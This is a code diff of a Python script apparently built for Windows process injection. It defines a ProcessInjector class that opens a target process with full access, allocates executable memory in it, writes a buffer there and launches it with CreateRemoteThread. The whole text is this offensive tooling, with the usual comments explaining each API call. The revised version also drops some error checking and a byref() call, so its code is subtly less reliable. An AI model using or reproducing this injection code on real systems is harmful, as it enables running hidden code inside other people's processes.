@@ -18,7 +18,7 @@ except ImportError:
     print("[-] The `windll` dll could not be imported")
     print("[-] Run this script on a Windows machine with Python3 installed")
     exit(1)
-    
+
 class ProcessInjector:
     def __init__(self, proc: Union[str, int], *, pid=False):
         if not pid:
@@ -34,8 +34,7 @@ class ProcessInjector:
         self.proc_handle = self.kern32.OpenProcess(
             PROCESS_ALL_ACCESS,
             False,
-            self.pid
-            )
+            self.pid)
         if not self.proc_handle:
             print("[-] Unable to obtain a handle to the target process")
             exit(1)
@@ -53,29 +52,35 @@ class ProcessInjector:
         return [p for p in pids() if ps(p).name() == proc][0]
     
     def virtual_alloc_ex(self, payload_size: int):
-        if not (alloc_mem_base_addr := self.kern32.VirtualAllocEx(
-            self.proc_handle, 0, payload_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE
-            )):
+        self.alloc_mem_base_addr = self.kern32.VirtualAllocEx(
+            self.proc_handle,       # Process handle
+            0,                      # Let function determine where to allocate the memory
+            payload_size,           # size of payload
+            MEM_COMMIT,             # Commit the region of virtual memory pages we created
+            PAGE_EXECUTE_READWRITE) # set read, write, and execute permissions to allocated memory
+        if not self.alloc_mem_base_addr:
             raise Exception(f"[-] Could not allocate memory in the target process: {self.pid}")
         else:
-            return alloc_mem_base_addr
+            return self.alloc_mem_base_addr
 
-    def write_process_memory(self, lp_base_addr, lp_buffer, n_size):
-        num_of_bytes_written = c_size_t(0)
+    def write_process_memory(self, lp_buffer, n_size):
+        num_bytes_written = c_size_t(0)
         # If the return value of `WriteProcessMemory`
         # is equal to 0, the function failed
-        if not (ret_val := self.kern32.WriteProcessMemory(
-            self.proc_handle,              # Process handle
-            lp_base_addr,                  # Base address returned by `VirtualAllocEx`
-            lp_buffer,                     # The data we want to write into the allocated memory
-            n_size,                        # The amount of data from our buffer we wish to write
-            byref(num_of_bytes_written))   # the variable that will store the number of bytes written
-            ):
-            print(ret_val)
-            raise Exception("[-] Failed to write data into the allocated memory")
-        print(ret_val)     
-            
+        self.kern32.WriteProcessMemory(
+            self.proc_handle,         # Process handle
+            self.alloc_mem_base_addr, # Base address returned by `VirtualAllocEx`
+            lp_buffer,                # The data we want to write into the allocated memory
+            n_size,                   # The amount of data from our buffer we wish to write
+            num_bytes_written)        # the number of bytes written
     
     def create_remote_thread(self):
-        return self.kern32.CreateRemoteThread()
+        self.kern32.CreateRemoteThread(
+            self.proc_handle,         # Process handle
+            None,                     # set default security descriptor 
+            0,                        # use default size of executable
+            self.alloc_mem_base_addr, # Base address returned by `VirtualAllocEx`
+            0,                        # ignore lpParamter
+            0,                        # run thread immediately after creation
+            0)                        # ignore thread identifier
         
